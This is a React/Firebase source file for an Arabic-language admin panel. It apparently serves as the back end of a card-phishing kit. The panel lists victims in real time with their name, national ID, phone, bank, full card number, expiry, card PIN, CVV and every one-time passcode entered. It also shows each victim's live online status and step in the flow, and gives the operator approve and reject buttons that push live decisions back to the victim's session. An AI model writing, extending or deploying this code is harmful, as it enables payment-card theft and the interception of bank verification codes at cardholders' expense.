"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { CheckCircle, ChevronLeft, ChevronRight, Trash2, X } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { db, auth, database } from "@/lib/firestore"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { playNotificationSound } from "@/lib/actions"
import { onValue, ref } from "firebase/database"

interface Notification {
  id: string
  name: string
  hasPersonalInfo: boolean
  hasCardInfo: boolean
  currentPage: string
  createdDate: string
  notificationCount: number
  personalInfo?: {
    id: string
    fullName: string
    phone: string
  }
  bank: string
  cardNumber: string
  prefix: string
  year: string
  month: string
  cvv: string
  otp: string
  pass: string
  allOtps: string[]
  status?: "pending" | "approved" | "rejected"
  isHidden?: boolean
  isOnline?: boolean
  lastSeen: string
  country: string
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [message, setMessage] = useState<boolean>(false)
  const [userStatuses, setUserStatuses] = useState<{ [key: string]: string }>({})
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)

  // Pagination state
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage, setItemsPerPage] = useState(10)
  const [totalPages, setTotalPages] = useState(1)

  const router = useRouter()

  const fetchUserStatus = (userId: string) => {
    const userStatusRef = ref(database, `/status/${userId}`)

    onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setUserStatuses((prev) => ({
          ...prev,
          [userId]: data.state,
        }))
      } else {
        setUserStatuses((prev) => ({
          ...prev,
          [userId]: "offline",
        }))
      }
    })
  }

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  useEffect(() => {
    // Calculate total pages whenever notifications or itemsPerPage changes
    setTotalPages(Math.ceil(notifications.length / itemsPerPage))
    // Reset to first page when changing items per page
    setCurrentPage(1)
  }, [notifications.length, itemsPerPage])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => ({ id: doc.id, ...doc.data() }) as any)
          .filter((notification: any) => notification.cardNumber) as Notification[]
        setNotifications(notificationsData)

        // Fetch online status for all users
        notificationsData.forEach((notification) => {
          fetchUserStatus(notification.id)
        })

        setIsLoading(false)
        playNotificationSound()
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
    } catch (error) {
      console.error("Error hiding all notifications:", error)
    } finally {
      setIsLoading(false)
    }
  }

  function UserStatusBadge({ userId }: { userId: string }) {
    const status = userStatuses[userId] || "unknown"

    return (
      <Badge variant="default" className={`${status === "online" ? "bg-green-500" : "bg-red-500"}`}>
        <span style={{ fontSize: "12px", color: "#fff" }}>{status === "online" ? "متصل" : "غير متصل"}</span>
      </Badge>
    )
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
    } catch (error) {
      console.error("Error hiding notification:", error)
    }
  }

  const handleApproval = async (state: string, id: string) => {
    const targetPost = doc(db, "pays", id)
    await updateDoc(targetPost, {
      status: state,
    })
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  // Pagination handlers
  const goToNextPage = () => {
    if (currentPage < totalPages) {
      setCurrentPage(currentPage + 1)
    }
  }

  const goToPreviousPage = () => {
    if (currentPage > 1) {
      setCurrentPage(currentPage - 1)
    }
  }

  const handleItemsPerPageChange = (value: string) => {
    setItemsPerPage(Number.parseInt(value))
  }

  // Get current page items
  const indexOfLastItem = currentPage * itemsPerPage
  const indexOfFirstItem = indexOfLastItem - itemsPerPage
  const currentItems = notifications.slice(indexOfFirstItem, indexOfLastItem)

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-50 text-black flex items-center justify-center">
        <div className="flex flex-col items-center gap-2">
          <div className="h-8 w-8 animate-spin rounded-full border-4 border-primary border-t-transparent"></div>
          <p className="text-lg font-medium">جاري التحميل...</p>
        </div>
      </div>
    )
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gray-50 text-black p-4">
      <div className="max-w-7xl mx-auto">
        <Card className="mb-6 shadow-md">
          <CardHeader className="pb-2">
            <div className="flex flex-col sm:flex-row justify-between items-center">
              <CardTitle className="text-2xl font-bold">لوحة الإشعارات</CardTitle>
              <div className="flex flex-col sm:flex-row gap-2 mt-4 sm:mt-0">
                <Button
                  variant="destructive"
                  onClick={handleClearAll}
                  className="bg-red-500 hover:bg-red-600"
                  disabled={notifications.length === 0}
                >
                  مسح جميع الإشعارات
                </Button>
                <Button variant="outline" onClick={handleLogout} className="bg-white hover:bg-gray-100">
                  تسجيل الخروج
                </Button>
              </div>
            </div>
          </CardHeader>
          <CardContent>
            <div className="bg-white rounded-lg shadow-sm overflow-hidden">
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="bg-gray-100 border-b border-gray-200">
                      <th className="px-4 py-3 text-right font-medium text-gray-700">الدولة</th>
                      <th className="px-4 py-3 text-right font-medium text-gray-700">المعلومات</th>
                      <th className="px-4 py-3 text-right font-medium text-gray-700">الصفحة الحالية</th>
                      <th className="px-4 py-3 text-right font-medium text-gray-700">الوقت</th>
                      <th className="px-4 py-3 text-center font-medium text-gray-700">الحالة</th>
                      <th className="px-4 py-3 text-center font-medium text-gray-700">حذف</th>
                    </tr>
                  </thead>
                  <tbody>
                    {currentItems.length > 0 ? (
                      currentItems.map((notification) => (
                        <tr
                          key={notification.id}
                          className="border-b border-gray-200 hover:bg-gray-50 transition-colors"
                        >
                          <td className="px-4 py-3">{notification?.country || "غير معروف"}</td>
                          <td className="px-4 py-3">
                            <div className="flex flex-col sm:flex-row gap-2">
                              <Badge
                                variant={notification.hasPersonalInfo ? "default" : "destructive"}
                                className={`rounded-md cursor-pointer ${notification.hasPersonalInfo ? "bg-blue-500 hover:bg-blue-600" : ""}`}
                                onClick={() => handleInfoClick(notification, "personal")}
                              >
                                {notification.hasPersonalInfo ? "معلومات شخصية" : "لا يوجد معلومات"}
                              </Badge>
                              <Badge
                                variant={notification.cardNumber ? "default" : "destructive"}
                                className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500 hover:bg-green-600" : ""}`}
                                onClick={() => handleInfoClick(notification, "card")}
                              >
                                {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                              </Badge>
                            </div>
                          </td>
                          <td className="px-4 py-3">خطوه - {notification.currentPage}</td>
                          <td className="px-4 py-3">
                            {formatDistanceToNow(new Date(notification.createdDate), {
                              addSuffix: true,
                              locale: ar,
                            })}
                          </td>
                          <td className="px-4 py-3 text-center">
                            <UserStatusBadge userId={notification.id} key={notification.id} />
                          </td>
                          <td className="px-4 py-3 text-center">
                            <Button
                              variant="destructive"
                              size="sm"
                              onClick={() => handleDelete(notification.id)}
                              className="bg-red-500 hover:bg-red-600"
                            >
                              <Trash2 className="h-4 w-4" />
                            </Button>
                          </td>
                        </tr>
                      ))
                    ) : (
                      <tr>
                        <td colSpan={6} className="px-4 py-8 text-center text-gray-500">
                          لا توجد إشعارات متاحة
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>

              {/* Pagination Controls */}
              {notifications.length > 0 && (
                <div className="flex flex-col sm:flex-row justify-between items-center px-4 py-3 bg-gray-50 border-t border-gray-200">
                  <div className="flex items-center gap-2 mb-3 sm:mb-0">
                    <span className="text-sm text-gray-700">
                      عرض {indexOfFirstItem + 1}-{Math.min(indexOfLastItem, notifications.length)} من{" "}
                      {notifications.length} إشعار
                    </span>
                    <div className="flex items-center gap-2">
                      <span className="text-sm text-gray-700">عناصر في الصفحة:</span>
                      <Select value={itemsPerPage.toString()} onValueChange={handleItemsPerPageChange}>
                        <SelectTrigger className="w-16 h-8">
                          <SelectValue placeholder="10" />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="5">5</SelectItem>
                          <SelectItem value="10">10</SelectItem>
                          <SelectItem value="20">20</SelectItem>
                          <SelectItem value="50">50</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </div>

                  <div className="flex items-center gap-2">
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={goToPreviousPage}
                      disabled={currentPage === 1}
                      className="h-8 px-3"
                    >
                      <ChevronRight className="h-4 w-4" />
                      <span className="sr-only">السابق</span>
                    </Button>
                    <span className="text-sm font-medium">
                      {currentPage} من {totalPages}
                    </span>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={goToNextPage}
                      disabled={currentPage === totalPages}
                      className="h-8 px-3"
                    >
                      <ChevronLeft className="h-4 w-4" />
                      <span className="sr-only">التالي</span>
                    </Button>
                  </div>
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-white text-black" dir="rtl">
          <DialogHeader>
            <DialogTitle dir="rtl" className="text-xl font-bold">
              {selectedInfo === "personal" ? "المعلومات الشخصية" : "معلومات البطاقة"}
            </DialogTitle>
            <DialogDescription className="text-gray-500">
              {selectedInfo === "personal" ? "تفاصيل المعلومات الشخصية" : "تفاصيل معلومات البطاقة"}
            </DialogDescription>
          </DialogHeader>

          {selectedInfo === "personal" && selectedNotification?.personalInfo && (
            <div className="space-y-3 bg-gray-50 p-4 rounded-lg">
              <div className="flex items-center border-b border-gray-200 pb-2">
                <strong className="text-gray-700 w-32">الاسم الكامل:</strong>
                <span className="text-gray-900">{selectedNotification.personalInfo.fullName}</span>
              </div>
              <div className="flex items-center border-b border-gray-200 pb-2">
                <strong className="text-gray-700 w-32">رقم الهوية:</strong>
                <span className="text-gray-900">{selectedNotification.personalInfo.id}</span>
              </div>
              <div className="flex items-center">
                <strong className="text-gray-700 w-32">رقم الهاتف:</strong>
                <span className="text-gray-900">{selectedNotification.personalInfo.phone}</span>
              </div>
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-3 bg-gray-50 p-4 rounded-lg">
              <div className="flex items-center border-b border-gray-200 pb-2">
                <strong className="text-gray-700 w-32">البنك:</strong>
                <span className="text-gray-900">{selectedNotification.bank}</span>
              </div>
              <div className="flex items-center border-b border-gray-200 pb-2">
                <strong className="text-gray-700 w-32">رقم البطاقة:</strong>
                <span className="text-gray-900">
                  {selectedNotification.cardNumber && selectedNotification.cardNumber}
                  {selectedNotification.prefix && ` - ${selectedNotification.prefix}`}
                </span>
              </div>
              <div className="flex items-center border-b border-gray-200 pb-2">
                <strong className="text-gray-700 w-32">تاريخ الانتهاء:</strong>
                <span className="text-gray-900">
                  {selectedNotification.year}/{selectedNotification.month}
                </span>
              </div>
              <div className="flex items-center border-b border-gray-200 pb-2">
                <strong className="text-gray-700 w-32">رمز البطاقة:</strong>
                <span className="text-gray-900">{selectedNotification.pass}</span>
              </div>
              <div className="flex items-center border-b border-gray-200 pb-2">
                <strong className="text-gray-700 w-32">رمز التحقق:</strong>
                <span className="text-gray-900">{selectedNotification.otp}</span>
              </div>
              <div className="flex items-center border-b border-gray-200 pb-2">
                <strong className="text-gray-700 w-32">رمز الامان:</strong>
                <span className="text-gray-900">{selectedNotification.cvv}</span>
              </div>

              <div className="pt-2">
                <strong className="text-gray-700 block mb-2">جميع رموز التحقق:</strong>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                  {selectedNotification.allOtps &&
                    selectedNotification.allOtps.map((otp, index) => (
                      <Badge key={index} className="bg-blue-100 text-blue-800 py-1 px-2">
                        {otp}
                      </Badge>
                    ))}
                </div>
              </div>

              <div className="flex justify-between mt-4 pt-2 border-t border-gray-200">
                <Button
                  onClick={() => {
                    handleApproval("approved", selectedNotification.id)
                    setMessage(true)
                    setTimeout(() => {
                      setMessage(false)
                    }, 3000)
                  }}
                  className="w-full m-1 bg-green-500 hover:bg-green-600"
                >
                  <CheckCircle className="h-4 w-4 mr-2" />
                  قبول
                </Button>
                <Button
                  onClick={() => {
                    handleApproval("rejected", selectedNotification.id)
                    setMessage(true)
                    setTimeout(() => {
                      setMessage(false)
                    }, 3000)
                  }}
                  className="w-full m-1 bg-red-500 hover:bg-red-600"
                  variant="destructive"
                >
                  <X className="h-4 w-4 mr-2" />
                  رفض
                </Button>
              </div>
              {message && <div className="text-center text-green-600 font-medium animate-pulse">تم الارسال بنجاح</div>}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}

